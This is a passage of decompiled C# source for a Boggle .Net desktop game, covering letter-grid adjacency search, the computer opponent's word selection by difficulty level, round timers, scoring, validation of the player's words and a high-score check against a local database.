				modGlobal.conBoggle.Open();
				modGlobal.cmdBog.set_CommandText("Insert Into PossibleLetters (BaseLetterSquare,BaseLetter,FriendLetterSquare,FriendLetter) Values (" + StringType.FromInteger(num) + ",'" + modGlobal.Cubes[num].CubeLetter + "'," + StringType.FromInteger(num2) + ",'" + modGlobal.Cubes[num2].CubeLetter + "')");
				modGlobal.cmdBog.ExecuteNonQuery();
				modGlobal.conBoggle.Close();
			}
			else
			{
				num = checked(num + 1);
				if (num > 15)
				{
					break;
				}
			}
		}
		FindNextLetterSquare(-100);
	}

	public int FindNextLetterSquare(int LetterSquare)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		if (_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init.State != 1)
		{
			Monitor.Enter(_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init);
			try
			{
				if (_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init.State == 0)
				{
					_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init.State = 2;
					_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection = new bool[16, 9];
				}
				else if (_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init.State = 1;
				Monitor.Exit(_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection_0024Init);
			}
		}
		if (LetterSquare == -100)
		{
			_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection = new bool[16, 9];
			int result = default(int);
			return result;
		}
		checked
		{
			int result2;
			if ((Strings.InStr(",0,1,2,3,7,11,15,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 7])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 7] = true;
				result2 = LetterSquare - 3;
			}
			else if ((Strings.InStr(",3,7,11,15,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 0])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 0] = true;
				result2 = LetterSquare + 1;
			}
			else if ((Strings.InStr(",3,7,11,15,14,13,12,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 1])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 1] = true;
				result2 = LetterSquare + 5;
			}
			else if ((Strings.InStr(",12,13,14,15,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 2])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 2] = true;
				result2 = LetterSquare + 4;
			}
			else if ((Strings.InStr(",0,4,8,12,13,14,15,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 3])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 3] = true;
				result2 = LetterSquare + 3;
			}
			else if ((Strings.InStr(",0,4,8,12,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 4])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 4] = true;
				result2 = LetterSquare - 1;
			}
			else if ((Strings.InStr(",0,4,8,12,1,2,3,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 5])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 5] = true;
				result2 = LetterSquare - 5;
			}
			else if ((Strings.InStr(",0,1,2,3,", "," + StringType.FromInteger(LetterSquare) + ",", (CompareMethod)0) == 0) & !_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 6])
			{
				_0024STATIC_0024FindNextLetterSquare_002420188_0024WentDirection[LetterSquare, 6] = true;
				result2 = LetterSquare - 4;
			}
			else
			{
				result2 = -1;
			}
			return result2;
		}
	}

	private void FindAllWords()
	{
		mnuEndGame.set_Enabled(false);
		ScanLetters();
		string word = default(string);
		FoundWords = modFindWords.FindWords(modFindWords.FindMode.AllWords, word);
		string text = default(string);
		switch (modGlobal.GameMode)
		{
		case modGlobal.Mode.Vs:
			text = "\r\nComputer: I found all my words!";
			break;
		}
		VBMath.Randomize();
		checked
		{
			int num = default(int);
			switch (modGlobal.GameLevel)
			{
			case modGlobal.Level.Easy:
				num = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 8f) + 1f);
				break;
			case modGlobal.Level.Medium:
				num = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 15f) + 1f);
				break;
			case modGlobal.Level.Hard:
				num = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 30f) + 1f);
				break;
			case modGlobal.Level.Impossible:
				num = (int)Math.Round(Conversion.Int(VBMath.Rnd() * 5000f) + 1f);
				break;
			}
			if (FoundWords.Rows.Count > num)
			{
				int num2 = num;
				bool flag = default(bool);
				for (int i = 0; i <= num2; i++)
				{
					while (!flag)
					{
						flag = true;
						VBMath.Randomize();
						int index = (int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)FoundWords.Rows.Count) + 0f);
						int num3 = Information.UBound((Array)WordsChosen, 1);
						for (int j = 0; j <= num3; j++)
						{
							if (ObjectType.ObjTst((object)WordsChosen[j], FoundWords.Rows[index][0], false) == 0)
							{
								flag = false;
							}
						}
					}
					WordsChosen = (string[])Utils.CopyArray((Array)WordsChosen, (Array)new string[i + 1]);
					WordsChosen[i] = StringType.FromObject(FoundWords.Rows[i][0]);
					flag = false;
				}
			}
			else
			{
				int num4 = FoundWords.Rows.Count - 1;
				for (int i = 0; i <= num4; i++)
				{
					WordsChosen = (string[])Utils.CopyArray((Array)WordsChosen, (Array)new string[i + 1]);
					WordsChosen[i] = StringType.FromObject(FoundWords.Rows[i][0]);
				}
			}
			((Control)lstCompFoundWords).Refresh();
			if (StringType.StrCmp(text, "", false) == 0)
			{
				text = "\r\nComputer: I found " + StringType.FromInteger(Information.UBound((Array)WordsChosen, 1)) + " words!";
			}
			RichTextBox val = txtMain;
			val.set_Text(val.get_Text() + text);
			mnuEndGame.set_Enabled(true);
			btnFinish.BogButtonEnabled = true;
		}
	}

	private void ShowWord()
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = modGlobal.Cubes.GetEnumerator();
			while (enumerator.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator.Current;
				modGlobal.myCube.CubeHighLight = Color.LightGray;
				modGlobal.myCube.CubeTextColor = Color.DarkBlue;
				modGlobal.myCube.CubeDownPic = null;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		IEnumerator enumerator2 = default(IEnumerator);
		string text = default(string);
		try
		{
			enumerator2 = FoundWords.Rows.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				DataRow dataRow = (DataRow)enumerator2.Current;
				if (ObjectType.ObjTst(dataRow["FoundWord"], (object)modGlobal.Cubes.WordToShow, false) == 0)
				{
					text = StringType.FromObject(dataRow["FoundWordSquares"]);
					break;
				}
			}
		}
		finally
		{
			if (enumerator2 is IDisposable)
			{
				((IDisposable)enumerator2).Dispose();
			}
		}
		int num = Strings.Len(modGlobal.Cubes.WordToShow);
		checked
		{
			if (Strings.InStr(Strings.UCase(modGlobal.Cubes.WordToShow), "Q", (CompareMethod)0) != 0)
			{
				num = Strings.Len(modGlobal.Cubes.WordToShow) - 1;
			}
			int num2 = num;
			IEnumerator enumerator3 = default(IEnumerator);
			for (int i = 1; i <= num2; i++)
			{
				int index;
				if (Strings.InStr(text, ",", (CompareMethod)0) == 0)
				{
					index = IntegerType.FromString(text);
				}
				else
				{
					index = IntegerType.FromString(Strings.Mid(text, 1, Strings.InStr(text, ",", (CompareMethod)0) - 1));
					text = Strings.Mid(text, Strings.InStr(text, ",", (CompareMethod)0) + 1);
				}
				modGlobal.Cubes[index].CubeHighLight = Color.Aquamarine;
				modGlobal.Cubes[index].CubeTextColor = Color.Red;
				ResetCubes();
				try
				{
					enumerator3 = modGlobal.Cubes.GetEnumerator();
					while (enumerator3.MoveNext())
					{
						modGlobal.myCube = (Cube)enumerator3.Current;
						modGlobal.myCube.CubeDownPic = null;
					}
				}
				finally
				{
					if (enumerator3 is IDisposable)
					{
						((IDisposable)enumerator3).Dispose();
					}
				}
				modGlobal.Cubes[index].CubeDownPic = picCubeDown;
				modGlobal.Cubes[index].ShowClick();
				Thread.Sleep(100);
			}
			ResetCubes();
			modGlobal.Cubes.WordToShow = "";
		}
	}

	private void picCubesUp_Paint(object sender, PaintEventArgs e)
	{
		modGlobal.Cubes.DrawCubes(e, modGlobal.Cubes.CubesState);
	}

	private void btnAddWord_Click(object sender, EventArgs e)
	{
		if (Strings.Len(Strings.Trim(txtWordFound.get_Text())) > 2)
		{
			lstHumanWordsFound.get_Items().Add((object)txtWordFound.get_Text());
			((Control)lblHumanWordsCount).set_Text(StringType.FromInteger(lstHumanWordsFound.get_Items().get_Count()));
			txtWordFound.set_Text("");
		}
		((Control)txtWordFound).Focus();
	}

	private void ShowText()
	{
		checked
		{
			int num;
			int num2;
			if (modGlobal.Cubes.DisplayTextFadeOut)
			{
				num = modGlobal.Cubes.DisplayTextMaxSize;
				num2 = modGlobal.Cubes.DisplayTextMaxSize + 100;
				num2 = (int)Math.Round((double)num / 2.0);
			}
			else
			{
				num = (int)Math.Round((double)modGlobal.Cubes.DisplayTextMaxSize / 2.0);
				num2 = num + 100;
			}
			modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Text;
			int num3 = num;
			for (int i = 1; i <= num3; i++)
			{
				((Control)this).Show();
				if (i == num2)
				{
					Thread.Sleep(1000);
				}
				((Control)picCubesUp).Refresh();
			}
			if (modGlobal.Cubes.DisplayTextFadeOut)
			{
				modGlobal.Cubes.DisplayText = "";
				((Control)picCubesUp).Refresh();
			}
			if (modGlobal.Cubes.DisplayTextStartUp)
			{
				modGlobal.Cubes.ShowSpinStartUp();
				while (modGlobal.Cubes.CubesAreSpinning)
				{
					Application.DoEvents();
				}
				btnScramble.BogButtonEnabled = true;
				txtMain.set_Text("5 seconds to re-scramble letters");
			}
			ShowTextThread.Suspend();
		}
	}

	private void txtWordFound_KeyPress(object sender, KeyPressEventArgs e)
	{
		if ((StringType.StrCmp(Strings.Mid(StringType.FromChar(e.get_KeyChar()), 1, 3), "\r", false) == 0) & btnAddWord.BogButtonEnabled)
		{
			btnAddWord_Click(this, new EventArgs());
		}
	}

	private void tmrContMain_Tick(object sender, EventArgs e)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		checked
		{
			_0024STATIC_0024tmrContMain_Tick_002420211C1211_0024LoadWaitTime++;
			if (!LoadTextShown & (_0024STATIC_0024tmrContMain_Tick_002420211C1211_0024LoadWaitTime == 5))
			{
				LoadTextShown = true;
				ShowDisplayText("Welcome\r\n      to\r\n  Boggle", FadeOut: false, StartUp: false, 160);
				tmrContMain.set_Enabled(false);
				mnuGame.set_Enabled(true);
				mnuOptions.set_Enabled(true);
				mnuHelp.set_Enabled(true);
				OleDbCommand val = new OleDbCommand("Select ShowForm From ShowWelcome", modGlobal.conBoggle);
				modGlobal.conBoggle.Open();
				OleDbDataReader val2 = val.ExecuteReader();
				val2.Read();
				if (ObjectType.ObjTst(val2.get_Item("ShowForm"), (object)0, false) == 0)
				{
					frmWelcome frmWelcome2 = new frmWelcome();
					((Control)frmWelcome2).Show();
				}
				val2.Close();
				modGlobal.conBoggle.Close();
			}
			else
			{
				if (!LoadTextShown)
				{
					return;
				}
				if (Strings.InStr(Strings.UCase(txtMain.get_Text()), "RE-SCRAMBLING", (CompareMethod)0) != 0)
				{
					ScramSec = 5.0;
					txtMain.set_Text("5 seconds to re-scramble letters");
				}
				else if (Strings.InStr(Strings.UCase(txtMain.get_Text()), "RE-SCRAMBLE", (CompareMethod)0) != 0)
				{
					if (ScramSec % 1.0 == 0.0)
					{
						txtMain.set_Text(StringType.FromDouble(ScramSec) + " seconds to re-scramble letters");
					}
					ScramSec -= 0.5;
					if (ScramSec == 0.0)
					{
						btnScramble.BogButtonEnabled = false;
						btnContinue.BogButtonEnabled = false;
						txtMain.set_Text("");
						ScramSec = 5.0;
						string text = StartLevel(JustObj: false);
						Min = IntegerType.FromString(Strings.Mid(text, 1, 1));
						Sec = DoubleType.FromString(Strings.Mid(text, 2));
						_0024STATIC_0024tmrContMain_Tick_002420211C1211_0024TimerGoing = true;
					}
				}
				else
				{
					if (!_0024STATIC_0024tmrContMain_Tick_002420211C1211_0024TimerGoing)
					{
						return;
					}
					Sec -= 0.5;
					if (Sec < 0.0)
					{
						if (Min == 0)
						{
							_0024STATIC_0024tmrContMain_Tick_002420211C1211_0024TimerGoing = false;
							btnScramble.BogButtonEnabled = false;
							Sec = 60.0;
							Min = 2;
							EndLevel();
							return;
						}
						Min--;
						Sec = 59.0;
					}
					string text2 = StringType.FromDouble(Sec);
					if (Sec < 10.0)
					{
						text2 = "0" + StringType.FromDouble(Sec);
					}
					if (Sec % 1.0 == 0.0)
					{
						tmrMain.TimerText = StringType.FromInteger(Min) + text2;
					}
				}
			}
		}
	}

	private void tmrBtn1_Click(object sender, EventArgs e)
	{
		object obj = LateBinding.LateGet(sender, (Type)null, "name", new object[0], (string[])null, (bool[])null);
		if (ObjectType.ObjTst(obj, (object)"tmrBtn1", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(0, 70, 0);
			tmrMain.LedOnColor = Color.LawnGreen;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn2", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(0, 0, 70);
			tmrMain.LedOnColor = Color.DeepSkyBlue;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn3", false) == 0)
		{
			tmrMain.LedBackColor = Color.Aquamarine;
			tmrMain.LedOffColor = Color.LightCyan;
			tmrMain.LedOnColor = Color.Teal;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn4", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(70, 0, 0);
			tmrMain.LedOnColor = Color.Red;
		}
		((Control)btnAddWord).Focus();
	}

	private void ShowDisplayText(string Text, bool FadeOut, bool StartUp, int MaxSize, int PositionOffSet = 0)
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = modGlobal.Cubes.GetEnumerator();
			while (enumerator.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator.Current;
				((Control)modGlobal.myCube.CubeLabel).set_Visible(false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		if (StringType.StrCmp(modGlobal.Cubes.DisplayText, "", false) != 0)
		{
			ShowTextThread.Suspend();
		}
		ShowTextThread = new Thread(ShowText);
		modGlobal.Cubes.DisplayTextFadeOut = FadeOut;
		modGlobal.Cubes.DisplayTextStartUp = StartUp;
		modGlobal.Cubes.DisplayTextMaxSize = MaxSize;
		modGlobal.Cubes.DisplayPosition = PositionOffSet;
		modGlobal.Cubes.DisplayText = Text;
		modGlobal.Cubes.CubesState = CubesCollection.StateOfCubes.Clear;
		((Control)picCubesUp).Refresh();
		ShowTextThread.Start();
	}

	private void mnuNewGame_Click(object sender, EventArgs e)
	{
		if (ShowTextThread.ThreadState == System.Threading.ThreadState.Running)
		{
			ShowTextThread.Suspend();
		}
		LoadTextShown = true;
		mnuEndGame.set_Enabled(true);
		mnuNewGame.set_Enabled(false);
		mnuOptions.set_Enabled(false);
		((Control)picCubeDown).set_Visible(false);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = modGlobal.Cubes.GetEnumerator();
			while (enumerator.MoveNext())
			{
				modGlobal.myCube = (Cube)enumerator.Current;
				modGlobal.myCube.CubeHighLight = Color.LightGray;
				modGlobal.myCube.CubeTextColor = Color.DarkBlue;
				modGlobal.myCube.CubeDownPic = null;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		txtMain.set_Text("");
		tmrContMain.set_Enabled(false);
		lstCompFoundWords.get_Items().Clear();
		lstHumanWordsFound.get_Items().Clear();
		ShowDisplayText("  Get\r\nReady!", FadeOut: true, StartUp: true, 180);
		StartLevel(JustObj: true);
		while (ShowTextThread.ThreadState != System.Threading.ThreadState.Suspended)
		{
			Application.DoEvents();
		}
		((Control)txtWordFound).Focus();
		tmrContMain.set_Enabled(true);
	}

	private string StartLevel(bool JustObj)
	{
		string text = default(string);
		bool bogButtonEnabled = default(bool);
		switch (modGlobal.GameMode)
		{
		case modGlobal.Mode.Vs:
			text = "Try to find more words than me before time runs out.\r\nGood luck, your gonna need it!";
			bogButtonEnabled = true;
			break;
		case modGlobal.Mode.BoardGame:
			text = "Players: find as many words as you can before time runs out. Good luck!";
			bogButtonEnabled = false;
			break;
		}
		((Control)lblHumanWordsCount).set_Text("0");
		((Control)lblCompWordsCount).set_Text("0");
		txtMain.set_Text(text);
		tmrMain.TimerText = Strings.Replace(Strings.Mid(modGlobal.TimerInterval.ToString(), 3), "c", "", 1, -1, (CompareMethod)0);
		checked
		{
			if (!JustObj)
			{
				Round++;
				((Control)lblRound).set_Text(StringType.FromInteger(Round));
				RichTextBox val = txtMain;
				val.set_Text(val.get_Text() + "\r\nComputer: Finding Words...");
				FindWordsThread = new Thread(FindAllWords);
				FindWordsThread.Start();
				btnAddWord.BogButtonEnabled = bogButtonEnabled;
				return Strings.Replace(Strings.Mid(modGlobal.TimerInterval.ToString(), 3), "c", "", 1, -1, (CompareMethod)0);
			}
			string result = default(string);
			return result;
		}
	}

	private void EndLevel()
	{
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		int num = Information.UBound((Array)WordsChosen, 1);
		checked
		{
			for (int i = 0; i <= num; i++)
			{
				lstCompFoundWords.get_Items().Add((object)WordsChosen[i]);
				((Control)lblCompWordsCount).set_Text(StringType.FromInteger(lstCompFoundWords.get_Items().get_Count()));
			}
			btnContinue.BogButtonEnabled = true;
			txtWordFound.set_Text("");
			int num2 = default(int);
			switch (modGlobal.GameMode)
			{
			case modGlobal.Mode.Vs:
				num2 = -1;
				btnAddWord.BogButtonEnabled = false;
				goto default;
			default:
			{
				if (lstHumanWordsFound.get_Items().get_Count() < num2)
				{
					txtMain.set_Text(string.Concat("Sorry, you did not find " + StringType.FromInteger(num2), " words.\r\nGame over...\r\nTry again!!"));
					ShowDisplayText("GAME\r\nOVER", FadeOut: false, StartUp: false, 180);
					break;
				}
				int num3 = lstHumanWordsFound.get_Items().get_Count() - 1;
				int num5 = default(int);
				string text = default(string);
				for (int i = 0; i <= num3; i++)
				{
					bool flag = true;
					int num4 = lstCompFoundWords.get_Items().get_Count() - 1;
					for (int j = 0; j <= num4; j++)
					{
						if (ObjectType.ObjTst(lstHumanWordsFound.get_Items().get_Item(i), lstCompFoundWords.get_Items().get_Item(j), false) == 0)
						{
							flag = false;
						}
					}
					if (flag)
					{
						num5++;
						text = ((StringType.StrCmp(text, "", false) != 0) ? StringType.FromObject(ObjectType.StrCatObj((object)text, ObjectType.StrCatObj((object)",", lstHumanWordsFound.get_Items().get_Item(i)))) : StringType.FromObject(ObjectType.StrCatObj((object)text, lstHumanWordsFound.get_Items().get_Item(i))));
					}
				}
				text = Strings.Replace(text, "\r\n", "", 1, -1, (CompareMethod)0);
				if (mnuEnableWordValidation.get_Checked() & (StringType.StrCmp(text, (string)null, false) != 0))
				{
					txtMain.set_Text("Validating Your Words...");
					Application.DoEvents();
					string text2 = modFindWords.ValidateWords(text);
					if (StringType.StrCmp(text2, (string)null, false) != 0)
					{
						MessageBox.Show("You have entered words that are impossible to make from the current letter configuration.\r\nThese words will be removed from the score calculation and excluded from your unique word list.\r\n\r\nInvalid words:    " + Strings.Mid(text2, 1, Strings.Len(text2) - 1), "Impossible Words Found", (MessageBoxButtons)0);
						while (StringType.StrCmp(text2, "", false) != 0)
						{
							num5--;
							string text3 = Strings.Mid(text2, 1, Strings.InStr(text2, ",", (CompareMethod)0) - 1);
							text2 = Strings.Mid(text2, Strings.InStr(text2, ",", (CompareMethod)0) + 1);
							text = Strings.Replace(text, text3 + ",", "", 1, -1, (CompareMethod)0);
							text = Strings.Replace(text, text3, "", 1, -1, (CompareMethod)0);
						}
					}
				}
				int num6 = ScoreWords(text);
				int num7 = num6;
				HumanScore += num6;
				((Control)lblHumanScore).set_Text(StringType.FromDouble(Conversion.Val(((Control)lblHumanScore).get_Text()) + (double)num6));
				txtMain.set_Text("Your unique words:  " + text);
				RichTextBox val = txtMain;
				val.set_Text(val.get_Text() + "\r\nYou found " + StringType.FromInteger(lstHumanWordsFound.get_Items().get_Count()) + " total words.");
				val = txtMain;
				val.set_Text(val.get_Text() + "\r\nYou found " + StringType.FromInteger(num5) + " unique words.");
				text = "";
				num5 = 0;
				int num8 = lstCompFoundWords.get_Items().get_Count() - 1;
				for (int i = 0; i <= num8; i++)
				{
					bool flag = true;
					int num9 = lstHumanWordsFound.get_Items().get_Count() - 1;
					for (int j = 0; j <= num9; j++)
					{
						if (ObjectType.ObjTst(lstCompFoundWords.get_Items().get_Item(i), lstHumanWordsFound.get_Items().get_Item(j), false) == 0)
						{
							flag = false;
						}
					}
					if (flag)
					{
						num5++;
						text = ((StringType.StrCmp(text, "", false) != 0) ? StringType.FromObject(ObjectType.StrCatObj((object)text, ObjectType.StrCatObj((object)",", lstCompFoundWords.get_Items().get_Item(i)))) : StringType.FromObject(ObjectType.StrCatObj((object)text, lstCompFoundWords.get_Items().get_Item(i))));
					}
				}
				text = Strings.Replace(text, "\r\n", "", 1, -1, (CompareMethod)0);
				val = txtMain;
				val.set_Text(val.get_Text() + "\r\nMy unique words: " + text);
				val = txtMain;
				val.set_Text(val.get_Text() + "\r\nI found " + StringType.FromInteger(lstCompFoundWords.get_Items().get_Count()) + "  total words.");
				val = txtMain;
				val.set_Text(val.get_Text() + "\r\nI found " + StringType.FromInteger(num5) + " unique words.");
				num6 = ScoreWords(text);
				int num10 = num6;
				ComputerScore += num6;
				((Control)lblCompScore).set_Text(StringType.FromDouble(Conversion.Val(((Control)lblCompScore).get_Text()) + (double)num6));
				if (num10 > num7)
				{
					((Control)lblComputerRounds).set_Text(StringType.FromDouble(Conversion.Val(((Control)lblComputerRounds).get_Text()) + 1.0));
					ComputerRounds++;
				}
				else
				{
					((Control)lblHumanRounds).set_Text(StringType.FromDouble(Conversion.Val(((Control)lblHumanRounds).get_Text()) + 1.0));
					HumanRounds++;
				}
				break;
			}
			case modGlobal.Mode.BoardGame:
				num2 = -1;
				txtMain.set_Text("Time is up! Tally up your points!\r\n\r\nClick \"Continue\" To Re-Start!");
				break;
			}
		}
	}

	public int ScoreWords(string Words)
	{
		if (Strings.Len(Words) == 0)
		{
			return 0;
		}
		Words += ",";
		checked
		{
			int num = default(int);
			while (StringType.StrCmp(Words, "", false) != 0)
			{
				string text = Strings.Mid(Words, 1, Strings.InStr(Words, ",", (CompareMethod)0) - 1);
				Words = Strings.Mid(Words, Strings.InStr(Words, ",", (CompareMethod)0) + 1);
				num = Strings.Len(text) switch
				{
					3 => num + 1, 
					4 => num + 2, 
					5 => num + 3, 
					_ => num + 4, 
				};
			}
			return num;
		}
	}

	private void tmrBtn1_Click_1(object sender, EventArgs e)
	{
		string timerText = tmrMain.TimerText;
		object obj = LateBinding.LateGet(sender, (Type)null, "name", new object[0], (string[])null, (bool[])null);
		if (ObjectType.ObjTst(obj, (object)"tmrBtn1", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(0, 70, 0);
			tmrMain.LedOnColor = Color.LawnGreen;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn2", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(0, 0, 70);
			tmrMain.LedOnColor = Color.DeepSkyBlue;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn3", false) == 0)
		{
			tmrMain.LedBackColor = Color.Aquamarine;
			tmrMain.LedOffColor = Color.LightCyan;
			tmrMain.LedOnColor = Color.Teal;
		}
		else if (ObjectType.ObjTst(obj, (object)"tmrBtn4", false) == 0)
		{
			tmrMain.LedBackColor = Color.Black;
			tmrMain.LedOffColor = Color.FromArgb(70, 0, 0);
			tmrMain.LedOnColor = Color.Red;
		}
		tmrMain.TimerText = timerText;
		((Control)btnAddWord).Focus();
	}

	private void lstCompFoundWords_MouseUp(object sender, MouseEventArgs e)
	{
		if (StringType.StrCmp(modGlobal.Cubes.WordToShow, "", false) != 0)
		{
			ShowWordThread.Abort();
		}
		modGlobal.Cubes.WordToShow = ((ListControl)lstCompFoundWords).GetItemText(RuntimeHelpers.GetObjectValue(lstCompFoundWords.get_SelectedItem()));
		ShowWordThread = new Thread(ShowWord);
		ShowWordThread.Start();
		if (mnuEnableDefSearch.get_Checked())
		{
			while (ShowWordThread.ThreadState == System.Threading.ThreadState.Running)
			{
				Application.DoEvents();
			}
			txtMain.set_Text("Querying Defenition...");
			Application.DoEvents();
			txtMain.set_Text(modFindWords.GetDef(((ListControl)lstCompFoundWords).GetItemText(RuntimeHelpers.GetObjectValue(lstCompFoundWords.get_SelectedItem()))));
			((TextBoxBase)txtMain).set_SelectionStart(0);
		}
	}

	private void ChangeMode(object sender, EventArgs e)
	{
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		txtMain.set_Text("");
		object obj = LateBinding.LateGet(sender, (Type)null, "text", new object[0], (string[])null, (bool[])null);
		if (ObjectType.ObjTst(obj, (object)"Board Game Mode", false) == 0)
		{
			modGlobal.GameMode = modGlobal.Mode.BoardGame;
			txtMain.set_Text("---Board Game Mode---");
		}
		else if (ObjectType.ObjTst(obj, (object)"Vs. Computer Mode", false) == 0)
		{
			modGlobal.GameMode = modGlobal.Mode.Vs;
			txtMain.set_Text("---Vs. Computer Mode---");
		}
		else if (ObjectType.ObjTst(obj, (object)"Teaching Mode", false) == 0)
		{
			MessageBox.Show("Teaching mode is not available on the PSC version of Boggle .Net. Sorry!", "Teaching Mode", (MessageBoxButtons)0);
			modGlobal.GameMode = modGlobal.Mode.Vs;
			txtMain.set_Text("---Vs. Computer Mode---");
		}
		RichTextBox val = txtMain;
		val.set_Text(val.get_Text() + "\r\n\r\nClick \"Game\" - \"New Game\" To Start!");
		mnuNewGame.set_Enabled(true);
		mnuEndGame.set_Enabled(false);
		mnuBoardGameMode.set_Checked(false);
		mnuVsMode.set_Checked(false);
		mnuTeachingMode.set_Checked(false);
		LateBinding.LateSet(sender, (Type)null, "checked", new object[1] { true }, (string[])null);
	}

	private void ChangeLevel(object sender, EventArgs e)
	{
		object obj = LateBinding.LateGet(sender, (Type)null, "text", new object[0], (string[])null, (bool[])null);
		if (ObjectType.ObjTst(obj, (object)"Level Easy", false) == 0)
		{
			modGlobal.GameLevel = modGlobal.Level.Easy;
		}
		else if (ObjectType.ObjTst(obj, (object)"Level Medium", false) == 0)
		{
			modGlobal.GameLevel = modGlobal.Level.Medium;
		}
		else if (ObjectType.ObjTst(obj, (object)"Level Hard", false) == 0)
		{
			modGlobal.GameLevel = modGlobal.Level.Hard;
		}
		else if (ObjectType.ObjTst(obj, (object)"Level Impossible to win", false) == 0)
		{
			modGlobal.GameLevel = modGlobal.Level.Impossible;
		}
		mnuLevelEasy.set_Checked(false);
		mnuLevelMedium.set_Checked(false);
		mnuLevelHard.set_Checked(false);
		mnuLevelImpossible.set_Checked(false);
		Round = 0;
		((Control)lblRound).set_Text(StringType.FromInteger(0));
		LateBinding.LateSet(sender, (Type)null, "checked", new object[1] { true }, (string[])null);
	}

	private void CheckHighScores()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		OleDbCommand val = new OleDbCommand("Select Count(*) as C From HighScores", modGlobal.conBoggle);
		modGlobal.conBoggle.Open();
		int num = IntegerType.FromObject(val.ExecuteScalar());
		modGlobal.conBoggle.Close();
		if (num != 0)
		{
			val.set_CommandText("Select Min(Rounds) as R From HighScores");
			modGlobal.conBoggle.Open();
			num = IntegerType.FromObject(val.ExecuteScalar());
			modGlobal.conBoggle.Close();
		}
		if (HumanRounds > num)
		{
			string text = default(string);
			switch (modGlobal.GameLevel)
			{
			case modGlobal.Level.Easy:
				text = "Easy";
				break;
			case modGlobal.Level.Medium:
				text = "Medium";
				break;
			case modGlobal.Level.Hard:
				text = "Hard";
				break;
			case modGlobal.Level.Impossible:
				text = "Impossible";
				break;
			}
			string text2 = Interaction.InputBox("Congradulations!\r\nYou have made the Boggle .Net high score list!\r\nEnter your name (5 Char Max).", "New High Score", "", -1, -1);
			if ((StringType.StrCmp(text2, "", false) == 0) | (Strings.Len(text2) > 5))
			{
				text2 = "Lazy";
			}
			val.set_CommandText("Select Count(*) as C From HighScores");
